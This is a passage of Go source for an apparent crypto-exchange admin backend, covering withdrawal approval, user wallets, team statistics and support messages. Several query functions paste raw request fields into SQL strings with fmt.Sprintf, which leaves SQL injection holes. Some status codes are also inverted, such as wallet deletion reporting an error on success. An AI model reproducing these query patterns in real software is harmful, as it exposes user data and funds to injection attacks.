	count := config.GlobalDB.JoinCount(models.DB_TABLE_WITHDRAW+" as w", models.DB_TABLE_USER+" as u", "u.id = w.uid", db.DB_PARAMS{"_": strings.Join(where, " AND ")})
	lr := make([]*models.Withdraw, 0)
	for _, v := range list {
		i := new(models.Withdraw)
		v.SetObj(i)

		uinfo := models.MODEL_USER.GetBaseInfo(v.Get("uid").ToInt())

		i.ParentName = uinfo.ParentName

		lr = append(lr, i)

	}
	return &AdminResponse{
		State: SUCCESS,
		Data: P{
			"list":          lr,
			"count":         count,
			"withdraw_pair": SYSTEM_MODEL.WithdrawPair(),
			"coin_list":     SYSTEM_MODEL.CoinKeyValPair(),
			"chan_type":     SYSTEM_MODEL.ContractFlag(),
		},
	}
}

func (u *UserModel) SaveWithdraw(rq P) *AdminResponse {
	t := rq.Ts()
	up := make(db.DB_PARAMS, 0)

	id := t.Get("id").ToInt()
	if id == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请确认要修改的信息",
		}
	}
	if v := t.Get("contract").ToString(); v != "" {
		up["contract"] = v
	}
	if v := t.Get("cointype").ToString(); v != "" {
		up["cointype"] = v
	}
	if v := t.Get("address").ToString(); v != "" {
		up["address"] = v
	}
	if v := t.Get("fact_credit").ToFloat(); v > 0 {
		up["fact_credit"] = v
	}

	_, err := config.GlobalDB.UpdateData(models.DB_TABLE_WITHDRAW, up, db.DB_PARAMS{"id": id})
	if err == nil {
		return &AdminResponse{
			State: SUCCESS,
			Data:  "修改 成功!",
		}
	}
	return &AdminResponse{
		State: ERROR,
		Data:  "修改失败!",
	}
}

/**
 *	处理提现请求
 */
func (u *UserModel) OpWithdraw(id int, state int, info string, password string) *AdminResponse {

	rs := new(AdminResponse)
	if id == 0 {
		rs.State = ERROR
		rs.Data = "请确认一个要处理的请求!"
		return rs
	}
	if password != OPERATION_PASSWORD {
		rs.State = ERROR
		rs.Data = "操作密码不正确"
		return rs
	}
	one := u.WithdrawOne(id)
	if one.State != 0 {
		rs.State = ERROR
		rs.Data = "该提现请求已经处理"
		return rs
	}

	up := db.DB_PARAMS{"state": state, "finishtime": utils.GetNow(), "info": info}
	_, err := config.GlobalDB.UpdateData(models.DB_TABLE_WITHDRAW, up, db.DB_PARAMS{"id": id})
	if err != nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "处理提现信息失败!",
		}
	}
	if state == 1 { //同意
		models.MODEL_USER.AddCredit(one.Uid, &models.CreditValue{
			Credit:          0,
			LockCredit:      -1 * one.Credit,
			VCrdit:          0,
			LockVCredit:     0,
			TeamCoinLogType: models.TEAM_LOG_WITHDRAW,
			TeamCoinLogInfo: models.QueueTeamLog{
				WithDraw:   one.Credit,
				CreateTime: utils.GetNow(),
			},
		})
	} else {
		models.MODEL_USER.AddCredit(one.Uid, &models.CreditValue{
			Credit:          one.Credit,
			LockCredit:      -1 * one.Credit,
			VCrdit:          0,
			LockVCredit:     0,
			UserCoinLogType: models.COIN_LOG_USER_WITHDRAW_FAILD,
			UserCoinLogInfo: models.QueueCreditLog{
				Credit:     one.Credit,
				LockCredit: -1 * one.Credit,
				Sn:         one.Sn,
				CreateTime: utils.GetNow(),
			},
		})
	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  "处理提现信息成功!",
	}
}

/**
 *	单条的提现请求
 */
func (u *UserModel) WithdrawOne(id int) *models.Withdraw {
	if id == 0 {
		return nil
	}
	one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_WITHDRAW, db.DB_PARAMS{"id": id}, db.DB_FIELDS{})
	r := new(models.Withdraw)
	one.SetObj(r)
	return r
}

/**
 *	构造用户sid
 */
func (s *UserModel) Sid() string {
	return fmt.Sprintf("w-%s", utils.RandName())
}

/**
 *	根据sid 检查用户是否登录
 *  返回用户uid
 */

func (s *UserModel) SA(sid string) int {
	if uid, err := config.GlobalRedis.GetValue(HASH_BY_LOGIN_ADMIN, sid); err == nil {
		re := db.DBValue{Value: uid}
		return re.ToInt()
	} else {
		fmt.Println("err", err, uid)
	}
	return 0
}

func (s *UserModel) SidInfo(sid string) *AdminInfo {
	u := s.SA(sid)

	if u == 0 {
		fmt.Println(" uid 为0")
		return nil
	}
	return s.Uinfo(u)
}

func (s *UserModel) UserWallet(rq P) *AdminResponse {
	t := rq.Ts()
	where := make([]string, 0)
	if v := t.Get("address").ToString(); v != "" {
		where = append(where, fmt.Sprintf(" (ua.address like '%%%s%%' OR u.username like '%%%s%%' OR u.id = '%s')", v, v, v))
	}
	if v := t.Get("cointype").ToString(); v != "" {
		where = append(where, fmt.Sprintf(" ua.cointype ='%s'", v))
	}
	if v := t.Get("contract").ToString(); v != "" {
		where = append(where, fmt.Sprintf(" ua.contract ='%s'", v))
	}
	list, _ := config.GlobalDB.JoinTable(models.DB_TABLE_USER_WITHDRAW_WALLET+" as ua ", models.DB_TABLE_USER+" AS u", " u.id = ua.uid", db.DB_PARAMS{"_": strings.Join(where, " AND ")}, db.DB_FIELDS{"ua.*", "u.username", "u.memo"}, utils.Order(t.Get("sort", "ua.id desc").ToString()), utils.Limit(t.Get("page").ToInt(), t.Get("limit").ToInt()))
	count := config.GlobalDB.JoinCount(models.DB_TABLE_USER_WITHDRAW_WALLET+" as ua ", models.DB_TABLE_USER+" AS u", " u.id = ua.uid", db.DB_PARAMS{})
	l := make([]interface{}, 0)
	for _, item := range list {
		n := make(map[string]interface{}, 0)
		item.SetInterface(&n)
		l = append(l, n)
	}
	return &AdminResponse{
		State: SUCCESS,
		Data: P{
			"list":      l,
			"count":     count,
			"chan_type": SYSTEM_MODEL.ContractFlag(),
			"coin_type": SYSTEM_MODEL.CoinKeyValPair(),
		},
	}
}
func (s *UserModel) DeluserWallet(id int) *AdminResponse {
	if id == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请确定有一个要删除的信息!",
		}
	}
	if _, err := config.GlobalDB.Delete(models.DB_TABLE_USER_WITHDRAW_WALLET, db.DB_PARAMS{"id": id}); err == nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "删除用户钱包成功!",
		}
	}
	return &AdminResponse{
		State: ERROR,
		Data:  "删除用户钱包失败!",
	}

}

func (s *UserModel) Uinfo(uid int) *AdminInfo {
	rs := new(AdminInfo)
	one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_ADMIN, db.DB_PARAMS{"id": uid}, db.DB_FIELDS{})
	fmt.Println("one", one)
	if one == nil {
		return nil
	}
	one.SetObj(rs)
	return rs
}

/**
 * 用户团队统计
 */
func (s *UserModel) UserTeamLevelCount(rq P) *AdminResponse {
	t := rq.Ts()
	uid := t.Get("uid").ToInt()
	if uid == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请指定一个查看的用户",
		}
	}
	where := make([]string, 0)
	sub_where := ""
	if v := t.Get("level").ToInt(); v > 0 {
		sub_where = fmt.Sprintf("  and ul.level = %d", v)
	}
	if v := t.Get("email").ToString(); v != "" {
		sub_where = sub_where + fmt.Sprintf("  and u.username like '%%%s%%'", v)
	}
	count := config.GlobalDB.GetCount("`users` AS u , `user_levels` AS ul", db.DB_PARAMS{"_": "u.id =ul.uid and ul.puid=" + t.Get("uid").ToString() + " " + sub_where + ""})
	if v := t.Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf("uc.daytime between %d and %d", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}
	list, _ := config.GlobalDB.JoinTable("(SELECT u.id,u.username,u.memo, u.createtime,ul.level FROM `users` AS u , `user_levels` AS ul WHERE u.id =ul.uid and ul.puid="+t.Get("uid").ToString()+" "+sub_where+" ) AS ut", "`user_count` AS uc", "uc.uid = ut.id", db.DB_PARAMS{"_": strings.Join(where, " AND ")}, db.DB_FIELDS{
		"ANY_VALUE(ut.id) as id",
		"ANY_VALUE(ut.username) username",
		"ANY_VALUE(ut.createtime) createtime",
		"ANY_VALUE(ut.level) level", "SUM(uc.recharge) as recharge, SUM(uc.withdraw) as withdraw, SUM(uc.trade) as trade, SUM(uc.trade_profit) trade_profit, SUM(uc.mining_count) mining_count, SUM(uc.mining_profit) mining_profit",
	}, " group by ut.id")
	l := make([]db.DB_PARAMS, 0)
	for _, item := range list {
		it := make(map[string]interface{}, 0)
		item.SetInterface(&it)
		l = append(l, it)
	}
	total := SYSTEM_MODEL.UserLevelListCount(rq)
	tss := make(map[string]interface{})
	total.SetInterface(&tss)
	return &AdminResponse{
		State: SUCCESS,
		Data: P{
			"list":  l,
			"count": count,
			"total": tss,
		},
	}

}
func (s *UserModel) MsgList(rq P) *AdminResponse {
	pdata := rq.Ts()
	where := make([]string, 0)
	if v := pdata.Get("search").ToString(); v != "" {
		where = append(where, fmt.Sprintf("(u.username like '%%%s%%' OR  u.id = '%s')", v, v))
	}
	if v := pdata.Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf("m.createtime between %d and %d ", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}
	if v := pdata.Get("is_read").ToString(); v != "" {
		where = append(where, fmt.Sprintf("m.state = %s", v))
	}

	list, _ := config.GlobalDB.JoinTable(models.DB_TABLE_USER_NOTICE+" as m", models.DB_TABLE_USER+" as u", "u.id = m.uid", db.DB_PARAMS{"_": strings.Join(where, " AND ")}, db.DB_FIELDS{"m.*", "u.username"}, utils.Limit(pdata.Get("page").ToInt(), pdata.Get("limit").ToInt()))
	count := config.GlobalDB.JoinCount(models.DB_TABLE_USER_NOTICE+" as m", models.DB_TABLE_USER+" as u", "u.id = m.uid", db.DB_PARAMS{"_": strings.Join(where, " AND ")})

	rs := make([]map[string]interface{}, 0)
	for _, item := range list {
		r := make(map[string]interface{}, 0)
		item.SetInterface(&r)
		rs = append(rs, r)
	}
	return &AdminResponse{
		State: SUCCESS,
		Data: &P{
			"count": count,
			"list":  rs,
		},
	}
}

func (s *UserModel) CustomServiceList(rq P) *AdminResponse {
	t := rq.Ts()
	where := make([]string, 0)
	if v := t.Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf(" cs.createtime between %d and %d", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}
	if v := t.Get("search").ToString(); v != "" {
		where = append(where, fmt.Sprintf(" (u.username like '%%%s%%' )", v))
	}

	list, _ := config.GlobalDB.JoinTable("(SELECT u.*,o.unread FROM (SELECT uid,content,createtime FROM `service_messages`  WHERE id IN(SELECT MAX(id) AS id FROM `service_messages`   GROUP BY  uid ) ) AS u LEFT JOIN (SELECT COUNT(*) AS unread,uid FROM  `service_messages`  WHERE read_state = 0 and flag = 1 GROUP BY uid) AS o ON  u.uid =o.uid order by u.createtime desc) as uo", models.DB_TABLE_USER+" as u", " u.id = uo.uid", db.DB_PARAMS{"_": strings.Join(where, " AND ")}, db.DB_FIELDS{"uo.*", "u.username"}, utils.Order(t.Get("sort", "  uo.createtime desc").ToString()))
	count := config.GlobalDB.JoinCount("(SELECT u.*,o.unread FROM (SELECT uid,ANY_VALUE(content) AS content,ANY_VALUE(createtime) AS createtime FROM `service_messages` GROUP BY  uid) AS u LEFT JOIN (SELECT COUNT(*) AS unread,uid FROM  `service_messages`  WHERE read_state = 1 GROUP BY uid) AS o ON  u.uid =o.uid) as uo", models.DB_TABLE_USER+" as u", " u.id = uo.uid", db.DB_PARAMS{"_": strings.Join(where, " AND ")})
	rs := make([]map[string]interface{}, 0)
	for _, item := range list {
		r := make(map[string]interface{}, 0)
		item.SetInterface(&r)
		content := make(map[string]interface{}, 0)
		userinfo := models.MODEL_USER.GetBaseInfo(item.Get("uid").ToInt())
		u := make(map[string]interface{}, 0)
		if userinfo != nil {
			if str, err := json.Marshal(userinfo); err == nil {
				json.Unmarshal(str, &u)
			}
		}
		u["loginip"] = utils.Long2Ip(userinfo.LoginIp)
		r["userinfo"] = u

		if v := item.Get("content").ToString(); v != "" {
			if err := json.Unmarshal([]byte(utils.ClearSchar(v)), &content); err == nil {
				//userinfo := models.MODEL_USER.GetBaseInfo(item.Get("uid").ToInt())

				r["content"] = content
			}

		}
		rs = append(rs, r)
	}
	return &AdminResponse{
		State: SUCCESS,
		Data: &P{
			"contact_list": rs,
			"count":        count,
			"msgtype":      &P{"pic": "图片", "text": "文字"},
		},
	}
}

/*
 *	获取指定用户的消息
 */
func (s *UserModel) UserByMessage(uid int) *AdminResponse {
	if uid == 0 {
		return nil
	}
	rs := make([]map[string]interface{}, 0)
	list, _ := config.GlobalDB.FetchRows(models.DB_TABLE_SERVICE_MESSAGE, db.DB_PARAMS{"uid": uid}, db.DB_FIELDS{}, " ORDER BY id ASC")
	for _, item := range list {
		if c, ok := item["content"]; ok {
			content := make(map[string]interface{}, 0)
			if err := json.Unmarshal([]byte(utils.ClearSchar(c)), &content); err == nil {

				rs = append(rs, map[string]interface{}{
					"id":         item["id"],
					"flag":       item["flag"],
					"read_state": item["read_state"],
					"uid":        item["uid"],
					"content":    content,
					"createtime": item["createtime"],
				})
				config.GlobalDB.UpdateData(models.DB_TABLE_SERVICE_MESSAGE, db.DB_PARAMS{"read_state": 1}, db.DB_PARAMS{"uid": uid, "flag": 1})
			} else {
				fmt.Println(err.Error())
			}
		}
	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  rs,
	}
}

func (u *UserModel) DelUserNotice(id int) *AdminResponse {
	if id == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请确认一个要删除的信息",
		}
	}
	_, err := config.GlobalDB.Delete(models.DB_TABLE_USER_NOTICE, db.DB_PARAMS{"id": id})
	if err != nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "删除信息失败",
		}
	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  "删除信息成功",
	}
}
func (u *UserModel) SendUserNotice(msg *UserNoticeMsg) *AdminResponse {
	/*if msg.Uid == "" {
		return &AdminResponse{
			State: ERROR,
			Data:  "接收人消息不能为空",
		}
	}
	user := models.MODEL_USER.GetBaseInfo(utils.GetInt(msg.Uid))
	if user == nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "接收人不存在",
		}
	}*/
	insert := map[string]interface{}{
		"content":    msg.Content,
		"uid":        msg.Uid,
		"title":      msg.Title,
		"createtime": utils.GetNow(),
		"is_read":    0,
	}
	var err error
	if msg.Id != "" {
		_, err = config.GlobalDB.UpdateData(models.DB_TABLE_USER_NOTICE, insert, db.DB_PARAMS{"id": msg.Id})
	} else {
		_, err = config.GlobalDB.InsertData(models.DB_TABLE_USER_NOTICE, insert)
	}
	if err != nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "发送通知失败!" + err.Error(),
		}
	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  "发送个人通知成功",
	}
}

/**
 *	发送消息
 */
func (u *UserModel) SendMsg(msg *CustomMsg) *AdminResponse {
	rs := new(AdminResponse)
	if msg.Uid == 0 {
		rs.State = ERROR
		rs.Data = "接收人错误"
		return rs
	}
	if msg.Msg == "" {
		rs.State = ERROR
		rs.Data = "发送内容不能为空!"
		return rs
	}
	in := db.DB_PARAMS{
		"msg":  msg.Msg,
		"type": msg.Type,
	}

	cstr, _ := json.Marshal(in)
	config.GlobalRedis.PushQueue(models.HASH_USER_SERVICE_MESSAGE, models.DBServiceMessage{
		Uid:        msg.Uid,
		Content:    string(cstr),
		SnId:       msg.SnId,
		CreateTime: utils.GetNow(),
		Flag:       2,
	})

	rs.State = SUCCESS
	rs.Data = "发送成功"

	return rs
}

/**
 *	删除联系人信息
 */
func (u *UserModel) DelCustomMsg(uid int) *AdminResponse {
	rs := new(AdminResponse)
	if uid == 0 {
		rs.State = SUCCESS
		rs.Data = "删除联系人失败!"
		return rs
	}
	config.GlobalDB.Delete(models.DB_TABLE_SERVICE_MESSAGE, db.DB_PARAMS{"uid": uid})
	rs.State = SUCCESS
	rs.Data = "删除成功!"
	return rs
}

/**
 *	退出uid
 */
func (s *UserModel) Logout(sid string) bool {
	config.GlobalRedis.Del(HASH_BY_LOGIN_ADMIN, sid)
	return true
}

/**
 *	用户资产折算
 */
func (s *UserModel) UserAssetConver(uid int) *AdminResponse {
	uinfo := models.MODEL_USER.GetBaseInfo(uid)
	if uinfo == nil {
		return &AdminResponse{State: ERROR, Data: "用户不能存在!"}
	}
	//当前钱包资产
	asset, _ := config.GlobalDB.FetchAll(models.DB_TABLE_USERASSETS, db.DB_PARAMS{"uid": uid}, db.DB_FIELDS{"(num+lock_num) as amount, ANY_VALUE(coin_pair) as coin_pair"})
	//矿机资产
	minnermoney, _ := config.GlobalDB.FetchOne(models.DB_TABLE_MINING_ORDER, db.DB_PARAMS{"state": 0, "uid": uid}, db.DB_FIELDS{"SUM(amount) as amount"})
	//永续合约
	contract, _ := config.GlobalDB.FetchOne(models.DB_TABLE_OPENED_TRADE, db.DB_PARAMS{"uid": uid, "trade_type": "2", "clear_time": 0}, db.DB_FIELDS{"SUM(credit) as amount"})
	//交割
	explode, _ := config.GlobalDB.FetchOne(models.DB_TABLE_OPENED_TRADE, db.DB_PARAMS{"uid": uid, "trade_type": "1", "clear_time": 0}, db.DB_FIELDS{"SUM(credit) as amount"})
	var asssetTotal float64
	for _, asset_item := range asset {
		item_price := models.MODEL_SYSTEM.GetLastCoinInfo(asset_item.Get("coin_pair").ToString())
		if item_price != nil && asset_item.Get("amount").ToFloat() > 0 {
			coinprice := item_price["close"].(float64)
			asssetTotal = asssetTotal + (asset_item.Get("amount").ToFloat() * coinprice)
		}

	}
	total := P{
		"asset":    asssetTotal,
		"minner":   minnermoney.Get("amount").ToFloat(),
		"contract": contract.Get("amount").ToFloat(),
		"explode":  explode.Get("amount").ToFloat(),
		"lock":     uinfo.LockCredit,
		"valid":    uinfo.Credit,
	}
	rs := make([]P, 0)
	totalmoney := 0.00
	for key, val := range total {
		rs = append(rs, P{
			"project": key,
			"asset":   val,
		})
		totalmoney = totalmoney + val.(float64)
	}
	rs = append(rs, P{"project": "total", "asset": totalmoney})
	return &AdminResponse{State: SUCCESS, Data: P{
		"asset": rs,
		"project": P{
			"asset":    "钱包折合资产",
			"minner":   "矿机",
			"contract": "永续",
			"explode":  "交割",
			"lock":     "冻结",
			"valid":    "可用",
			"total":    "总计",
		},
	}}
}
